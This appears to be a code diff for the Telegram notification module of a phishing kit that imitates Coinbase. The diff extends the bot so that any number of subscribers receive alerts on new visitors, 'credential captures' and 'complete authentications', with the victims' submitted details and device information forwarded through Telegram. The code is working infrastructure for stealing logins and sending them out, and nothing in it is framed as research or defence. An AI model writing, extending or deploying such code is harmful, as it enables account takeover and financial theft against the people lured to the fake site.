@@ -1,15 +1,69 @@
 const TelegramBot = require('node-telegram-bot-api');
 
-// Initialize bot (will only work if token is provided)
+// Initialize bot with polling to receive messages
 let bot = null;
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
-  console.log('✅ Telegram bot initialized');
+// Store all chat IDs that have started the bot
+const subscribedChats = new Set();
+
+// Initialize with default chat ID if provided (for backward compatibility)
+if (process.env.TELEGRAM_CHAT_ID) {
+  subscribedChats.add(process.env.TELEGRAM_CHAT_ID);
+}
+
+if (TELEGRAM_BOT_TOKEN) {
+  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
+  console.log('✅ Telegram bot initialized with polling');
+  
+  // Handle /start command - add user to subscribers
+  bot.onText(/\/start/, (msg) => {
+    const chatId = msg.chat.id.toString();
+    subscribedChats.add(chatId);
+    
+    bot.sendMessage(chatId, `
+🎉 *Welcome to Coinbase Clone Monitor!*
+
+You are now subscribed to receive notifications.
+
+You will get alerts for:
+• 👁️ New visitors
+• 📧 Credential captures
+• ✅ Complete authentications
+
+Total subscribers: ${subscribedChats.size}
+    `, { parse_mode: 'Markdown' });
+    
+    console.log(`✅ New subscriber: ${chatId} (Total: ${subscribedChats.size})`);
+  });
+  
+  // Handle /stop command - remove user from subscribers
+  bot.onText(/\/stop/, (msg) => {
+    const chatId = msg.chat.id.toString();
+    subscribedChats.delete(chatId);
+    
+    bot.sendMessage(chatId, '👋 You have been unsubscribed from notifications.');
+    console.log(`❌ Unsubscribed: ${chatId} (Total: ${subscribedChats.size})`);
+  });
+  
+  // Handle /status command - show subscription status
+  bot.onText(/\/status/, (msg) => {
+    const chatId = msg.chat.id.toString();
+    const isSubscribed = subscribedChats.has(chatId);
+    
+    bot.sendMessage(chatId, `
+📊 *Your Status*
+
+Subscribed: ${isSubscribed ? '✅ Yes' : '❌ No'}
+Total subscribers: ${subscribedChats.size}
+Your Chat ID: \`${chatId}\`
+
+${!isSubscribed ? 'Send /start to subscribe!' : ''}
+    `, { parse_mode: 'Markdown' });
+  });
+  
 } else {
-  console.log('⚠️  Telegram bot not configured (missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID)');
+  console.log('⚠️  Telegram bot not configured (missing TELEGRAM_BOT_TOKEN)');
 }
 
 // Helper function to format messages
@@ -18,10 +72,32 @@ const escapeMarkdown = (text) => {
   return String(text).replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
 };
 
+// Helper function to send message to all subscribers
+const sendToAllSubscribers = async (message, options = {}) => {
+  if (!bot || subscribedChats.size === 0) {
+    console.log('No subscribers to send to');
+    return;
+  }
+  
+  const promises = Array.from(subscribedChats).map(chatId => 
+    bot.sendMessage(chatId, message, options).catch(err => {
+      console.error(`Failed to send to ${chatId}:`, err.message);
+      // If user blocked the bot, remove them from subscribers
+      if (err.message.includes('blocked') || err.message.includes('user is deactivated')) {
+        subscribedChats.delete(chatId);
+        console.log(`Removed inactive user: ${chatId}`);
+      }
+    })
+  );
+  
+  await Promise.all(promises);
+  console.log(`✅ Sent to ${subscribedChats.size} subscribers`);
+};
+
 // Send visitor notification
 const sendVisitorNotification = async (visitorData) => {
-  if (!bot || !TELEGRAM_CHAT_ID) {
-    console.log('Telegram not configured, skipping visitor notification');
+  if (!bot || subscribedChats.size === 0) {
+    console.log('Telegram not configured or no subscribers, skipping visitor notification');
     return;
   }
 
@@ -50,11 +126,11 @@ Referrer: ${escapeMarkdown(visitorData.referrer || 'Direct')}
 ⏰ Time: ${new Date().toLocaleString()}
 `;
 
-    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { 
+    await sendToAllSubscribers(message, { 
       parse_mode: 'Markdown',
       disable_web_page_preview: true 
     });
-    console.log('✅ Visitor notification sent to Telegram');
+    console.log('✅ Visitor notification sent to all subscribers');
   } catch (error) {
     console.error('❌ Error sending visitor notification:', error.message);
   }
@@ -62,8 +138,8 @@ Referrer: ${escapeMarkdown(visitorData.referrer || 'Direct')}
 
 // Send credential capture notification (initial step)
 const sendCredentialStartNotification = async (provider, data) => {
-  if (!bot || !TELEGRAM_CHAT_ID) {
-    console.log('Telegram not configured, skipping credential start notification');
+  if (!bot || subscribedChats.size === 0) {
+    console.log('Telegram not configured or no subscribers, skipping credential start notification');
     return;
   }
 
@@ -132,11 +208,11 @@ Screen: ${escapeMarkdown(data.userDetails?.screenResolution || 'Unknown')}
 `;
     }
 
-    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { 
+    await sendToAllSubscribers(message, { 
       parse_mode: 'Markdown',
       disable_web_page_preview: true 
     });
-    console.log(`✅ ${provider} start notification sent to Telegram`);
+    console.log(`✅ ${provider} start notification sent to all subscribers`);
   } catch (error) {
     console.error('❌ Error sending credential start notification:', error.message);
   }
@@ -144,8 +220,8 @@ Screen: ${escapeMarkdown(data.userDetails?.screenResolution || 'Unknown')}
 
 // Send complete credential capture notification
 const sendCredentialCompleteNotification = async (provider, data) => {
-  if (!bot || !TELEGRAM_CHAT_ID) {
-    console.log('Telegram not configured, skipping credential complete notification');
+  if (!bot || subscribedChats.size === 0) {
+    console.log('Telegram not configured or no subscribers, skipping credential complete notification');
     return;
   }
 
@@ -232,11 +308,11 @@ Browser: ${escapeMarkdown(data.userDetails?.userAgent?.substring(0, 50) || 'Unkn
 `;
     }
 
-    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { 
+    await sendToAllSubscribers(message, { 
       parse_mode: 'Markdown',
       disable_web_page_preview: true 
     });
-    console.log(`✅ ${provider} complete notification sent to Telegram`);
+    console.log(`✅ ${provider} complete notification sent to all subscribers`);
   } catch (error) {
     console.error('❌ Error sending credential complete notification:', error.message);
   }
